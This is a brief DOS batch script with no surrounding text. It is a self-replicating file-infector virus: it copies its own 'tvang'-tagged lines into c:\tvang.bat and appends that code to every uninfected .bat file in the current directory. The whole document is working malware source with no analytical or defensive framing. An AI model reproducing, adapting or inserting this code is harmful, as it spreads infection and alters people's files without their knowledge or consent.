rem ----------------------------------------------------------------------------------------------
rem ----------------------------------------------------------------------------------------------
@echo off>nul.tvang
if '%1=='InF goto tvang_inf
if exist c:\tvang.bat goto tvang_run
if not exist %0.bat goto tvang_end
find "tvang"<%0.bat>c:\tvang.bat
:tvang_run
for %%a in (*.bat) do call c:\tvang InF %%a
goto tvang_end
:tvang_inf
find "tvang"<%2>nul
if not errorlevel 1 goto tvang_end
type c:\tvang.bat>>%2
:tvang_end
